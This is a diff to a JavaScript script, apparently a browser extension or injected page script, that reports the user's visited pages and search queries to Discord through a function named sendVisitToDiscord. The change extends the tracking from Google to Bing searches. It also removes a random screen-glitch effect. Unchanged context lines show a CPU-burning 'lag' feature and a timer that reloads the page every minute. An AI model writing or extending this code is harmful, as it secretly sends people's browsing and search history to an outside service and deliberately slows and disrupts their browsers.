@@ -17,8 +17,17 @@ function sendVisitToDiscord(url) {
   if (hostname.includes("google.") && pathname === "/search") {
     const query = searchParams.get("q");
     if (query) {
-      title = `🔍 Searched "${query}" on ${hostname}`;
-      description += `\n🔗 Search: "${query}"`;
+      title = `🔍 Searched "${query}" on Google`;
+      description += `\n🔗 Search Query: "${query}"`;
+    }
+  }
+
+  // Check for Bing Search
+  if (hostname.includes("bing.") && pathname === "/search") {
+    const query = searchParams.get("q");
+    if (query) {
+      title = `🔍 Searched "${query}" on Bing`;
+      description += `\n🔗 Search Query: "${query}"`;
     }
   }
 
@@ -74,69 +83,8 @@ if (ENABLE_LAG) {
   burnTabCPU();
 }
 
-// --------- GLITCH EFFECT ---------
+// --------- AUTO REFRESH SYSTEM ---------
 
-function glitchUI() {
-  const body = document.body;
-
-  if (!document.getElementById('glitch-style')) {
-    const style = document.createElement('style');
-    style.id = 'glitch-style';
-    style.textContent = `
-      @keyframes glitch-shift {
-        0% { transform: translate(0); filter: none; }
-        20% { transform: translate(-2px, 2px) skew(0.5deg); filter: drop-shadow(2px 2px red); }
-        40% { transform: translate(2px, -2px) skew(-0.5deg); filter: drop-shadow(-2px -2px cyan); }
-        60% { transform: translate(-1px, 1px) skew(0.3deg); filter: drop-shadow(1px 1px magenta); }
-        80% { transform: translate(1px, -1px) skew(-0.3deg); filter: drop-shadow(-1px -1px yellow); }
-        100% { transform: translate(0); filter: none; }
-      }
-      .glitch-effect {
-        animation: glitch-shift 0.3s ease-in-out;
-        animation-iteration-count: 3;
-        animation-direction: alternate;
-      }
-      .glitch-rgb {
-        filter: url('#rgbShiftFilter');
-      }
-    `;
-    document.head.appendChild(style);
-
-    const svgFilter = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-    svgFilter.innerHTML = `
-      <filter id="rgbShiftFilter">
-        <feColorMatrix in="SourceGraphic" type="matrix"
-          values="1 0 0 0 0
-                  0 1 0 0 0
-                  0 0 1 0 0
-                  0 0 0 1 0" result="normal"/>
-        <feOffset in="normal" dx="2" dy="0" result="off1"/>
-        <feOffset in="normal" dx="-2" dy="0" result="off2"/>
-        <feBlend in="off1" in2="off2" mode="screen"/>
-      </filter>
-    `;
-    document.body.appendChild(svgFilter);
-  }
-
-  body.classList.add('glitch-effect');
-  setTimeout(() => {
-    body.classList.remove('glitch-effect');
-  }, 500);
-}
-
-function startRandomGlitch() {
-  (function scheduleNext() {
-    const delay = 30000 + Math.random() * 30000;
-    setTimeout(() => {
-      glitchUI();
-      scheduleNext();
-    }, delay);
-  })();
-}
-
-startRandomGlitch();
-
-// Automatically Refreshes the page every 1 minute or so
 function startAutoRefresh() {
   setInterval(() => {
     location.reload();
